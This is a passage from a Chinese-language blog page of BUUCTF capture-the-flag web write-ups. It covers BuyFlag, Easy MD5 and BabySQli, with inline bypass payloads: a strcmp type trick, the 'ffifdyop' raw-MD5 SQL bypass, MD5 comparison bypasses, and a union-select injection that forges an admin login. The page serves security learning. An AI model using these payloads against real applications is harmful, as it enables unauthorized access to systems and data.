+<p><img src="/2021/01/16/BUUctf-wp/99.jpg"></p>
+<p>提示说钱的长度太长，这里可以用科学计数法1e10</p>
+<p>有的师傅们提示是strcmp函数。这个函数在数据类型不匹配的时候会返回0，也就是和比较成功的结果是一样的。因此只要传入非字符串类型就可以了。最后得到flag。</p>
+<p><img src="/2021/01/16/BUUctf-wp/100.jpg"></p>
+<h2 id="十九、-BJDCTF2020-Easy-MD5"><a href="#十九、-BJDCTF2020-Easy-MD5" class="headerlink" title="十九、[BJDCTF2020]Easy MD5"></a>十九、[BJDCTF2020]Easy MD5</h2><p>打开页面只有个查询输入框，先输个1，结果没有什么变化，但是url上多了个password=1.</p>
+<p><img src="/2021/01/16/BUUctf-wp/101.jpg"></p>
+<p>先看看是不是sql注入，试了下1‘ or 1=1#，还是没回显</p>
+<p><img src="/2021/01/16/BUUctf-wp/102.jpg"></p>
+<p>后面还试了延时注入，都是无回显，所以试试抓包。但是也没什么发现，之后无意间在response中发现了hint，真是藏得太深了。</p>
+<p><img src="/2021/01/16/BUUctf-wp/103.jpg"></p>
+<p>百度了password=MD5（$pass,ture）,师傅们给了一个绕过方法<strong>ffifdyop</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/March97/article/details/81222922">绕过链接</a>        </p>
+<p>接着就在元素查看器中出现了代码</p>
+<p><img src="/2021/01/16/BUUctf-wp/104.jpg"></p>
+<p>代码很简单，就是MD5弱绕过，找两个0e开头的MD5值或者数组就可</p>
+<p><img src="/2021/01/16/BUUctf-wp/105.jpg"></p>
+<p>接着又是一个绕过为强绕过，绕过方法只能用第二种</p>
+<p><img src="/2021/01/16/BUUctf-wp/106.jpg"></p>
+<hr>
+<h2 id="二十、-GXYCTF2019-BabySQli"><a href="#二十、-GXYCTF2019-BabySQli" class="headerlink" title="二十、[GXYCTF2019]BabySQli"></a>二十、[GXYCTF2019]BabySQli</h2><p>由题目和界面可知这是一个sql注入题。首先试了下1’ or 1=1#,结果报错</p>
+<p><img src="/2021/01/16/BUUctf-wp/107.jpg"></p>
+<p>猜测or是被过滤了，接着输入了1，回显是错误user</p>
+<p><img src="/2021/01/16/BUUctf-wp/108.jpg"></p>
+<p>查看源代码，发现了提示</p>
+<p><img src="/2021/01/16/BUUctf-wp/109.jpg"></p>
+<p>将提示最终以base32和base64两次解码成功</p>
+<p><img src="/2021/01/16/BUUctf-wp/110.jpg"></p>
+<p>闭合方式没有错，更加确定是过滤了or。</p>
+<p>阅读了其他师傅的wp后涨了姿势：</p>
+<p>mysql在查询不存在的数据时，会自动构建虚拟数据</p>
+<p>如：当我们输入username=1&amp;password=1时，此时数据库没有匹配到，就会临时创建这两条数据。</p>
+<p>使用union联合注入这题时，会把2,3注入位的数据分别当做新的username和password。而这题的password是以MD5的方式存储在数据库中，所以师傅的payload为<code>1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code></p>
+<p>3号位为一个MD5值，所以就构造了一个username=admin；password=202cb962ac59075b964b07152d234b70的用户，于是就得到了flag</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46246804/article/details/109128549?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161452299816780264087906%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161452299816780264087906&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-109128549.first_rank_v2_pc_rank_v29&utm_term=%5BGXYCTF2019%5DBabySQli">参考</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/24/web-writeup/" rel="prev" title="web-writeup-1">
+      <i class="fa fa-chevron-left"></i> web-writeup-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/17/sql-libs-wp/" rel="next" title="sql-libs-wp">
+      sql-libs-wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BUUCTF-WriteUp"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF-WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Secret-File"><span class="nav-number">1.1.</span> <span class="nav-text">一、Secret File</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E8%A7%A3%E9%A2%98"><span class="nav-number">1.1.1.</span> <span class="nav-text">1、解题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.1.2.</span> <span class="nav-text">2、学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-strstr-%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">PHP strstr() 函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%AE%9A%E4%B9%89%E5%92%8C%E7%94%A8%E6%B3%95"><span class="nav-number">1.1.2.1.1.</span> <span class="nav-text">（1）定义和用法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E8%AF%AD%E6%B3%95"><span class="nav-number">1.1.2.1.2.</span> <span class="nav-text">（2）语法</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec1"><span class="nav-number">1.2.</span> <span class="nav-text">二、[ACTF2020 新生赛]Exec1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E8%A7%A3%E9%A2%98-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">1、解题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">2、学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="nav-number">1.2.2.0.1.</span> <span class="nav-text">常见管道符</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81-BJDCTF-2nd-%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="nav-number">1.3.</span> <span class="nav-text">三、[BJDCTF 2nd]假猪套天下第一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E8%A7%A3%E9%A2%98-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">1、解题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">2、学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Header%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">Header请求头参数详解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL1"><span class="nav-number">1.4.</span> <span class="nav-text">四、[极客大挑战 2019]EasySQL1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">1.5.</span> <span class="nav-text">五、[强网杯 2019]随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81-SUCTF-2019-EasySQL"><span class="nav-number">1.6.</span> <span class="nav-text">六、[SUCTF 2019]EasySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%951"><span class="nav-number">1.6.1.</span> <span class="nav-text">法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%952"><span class="nav-number">1.6.2.</span> <span class="nav-text">法2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="nav-number">1.7.</span> <span class="nav-text">七、[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL1"><span class="nav-number">1.8.</span> <span class="nav-text">八、[极客大挑战 2019]BabySQL1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81-GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">1.9.</span> <span class="nav-text">九、[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81-RoarCTF-2019-Easy-Calc"><span class="nav-number">1.10.</span> <span class="nav-text">十、[RoarCTF 2019]Easy Calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81-HCTF-2018-WarmUp"><span class="nav-number">1.11.</span> <span class="nav-text">十一、[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="nav-number">1.12.</span> <span class="nav-text">十二、[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-number">1.13.</span> <span class="nav-text">十三、[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife1"><span class="nav-number">1.14.</span> <span class="nav-text">十四、[极客大挑战 2019]Knife1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%94%E3%80%81-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">1.15.</span> <span class="nav-text">十五、[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%85%AD%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http1"><span class="nav-number">1.16.</span> <span class="nav-text">十六、[极客大挑战 2019]Http1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%83%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="nav-number">1.17.</span> <span class="nav-text">十七、[极客大挑战 2019]Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%85%AB%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="nav-number">1.18.</span> <span class="nav-text">十八、[极客大挑战 2019]BuyFlag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81-BJDCTF2020-Easy-MD5"><span class="nav-number">1.19.</span> <span class="nav-text">十九、[BJDCTF2020]Easy MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81-GXYCTF2019-BabySQli"><span class="nav-number">1.20.</span> <span class="nav-text">二十、[GXYCTF2019]BabySQli</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
